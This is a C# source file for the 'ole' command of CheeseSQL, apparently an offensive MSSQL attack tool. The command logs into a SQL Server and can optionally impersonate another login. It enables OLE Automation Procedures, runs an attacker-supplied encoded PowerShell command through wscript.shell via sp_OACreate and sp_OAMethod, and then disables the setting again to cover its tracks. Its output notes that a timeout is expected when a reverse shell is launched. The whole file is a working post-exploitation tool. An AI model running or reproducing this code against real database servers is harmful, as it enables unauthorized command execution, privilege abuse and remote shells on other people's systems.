using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class ole : ICommand
    {
        public static string CommandName => "ole";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/command:COMMAND " +
                $"[/impersonate:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string database = "";
            string connectserver = "";
            string cmd = "";
            string user = "";
            string password = "";
            string connectInfo = "";
            string impersonate = "";

            bool sqlauth = false;
            bool brokenConnection = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = arguments["/impersonate"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                return;
            }

            SqlCommand command;
            SqlDataReader reader;

            if (!String.IsNullOrEmpty(impersonate))
            {
                string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
                command = new SqlCommand(execAs, connection);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Attempting impersonation as {0}..", impersonate);
                reader.Close();
            }
            string enableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            command = new SqlCommand(enableOle, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling OLE Automation Procedures..");
            reader.Close();

            try
            {
                string execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc {cmd}';";
                command = new SqlCommand(execCmd, connection);
                using (reader = command.ExecuteReader())
                {
                    try
                    {
                        reader.Read();
                        Console.WriteLine("[+] Command result: " + reader[0]);
                    }
                    catch { }
                }
            }
            catch (SqlException e)
            {
                if (e.Message.Contains("Execution Timeout Expired"))
                {
                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is expected");
                    brokenConnection = true;
                }
                else
                {
                    Console.WriteLine($"[-] Exception: {e.Message}");
                    return;
                }
            }

            string disableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;";
            if (brokenConnection)
            {
                connection = new SqlConnection(connectInfo);
                connection.Open();

                if (!String.IsNullOrEmpty(impersonate))
                {
                    string execAs = $"EXECUTE AS LOGIN = '{impersonate}';";
                    command = new SqlCommand(execAs, connection);
                    reader = command.ExecuteReader();
                    reader.Read();
                    reader.Close();
                }
            }

            command = new SqlCommand(disableOle, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling OLE Automation Procedures..");
            reader.Close();

            connection.Close();
        }
    }
}
